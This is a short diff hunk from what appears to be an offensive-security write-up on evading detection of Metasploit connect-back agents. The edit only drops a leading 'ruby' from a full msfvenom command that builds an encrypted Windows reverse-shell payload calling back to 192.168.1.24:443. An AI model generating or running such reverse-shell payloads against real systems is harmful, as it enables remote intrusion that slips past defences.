@@ -14,7 +14,7 @@ Right now we still have the meterpreter agent connect back. However any meterpre
 A solution is to use the [new MSF payloads](https://blog.rapid7.com/2019/11/21/metasploit-shellcode-grows-up-encrypted-and-authenticated-c-shells/) which are returning a simple command line with a ChaCha20 ciphered communication:  
   
 ```
-ruby msfvenom -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.1.24 LPORT=443 --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c
+msfvenom -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.1.24 LPORT=443 --encrypt aes256 --encrypt-iv E7a0eCX76F0YzS4j --encrypt-key 6ASMkFslyhwXehNZw048cF1Vh1ACzyyR -f c -o /tmp/meterpreter.c
 ```
 ********************************
 Initsiate path variables for libs
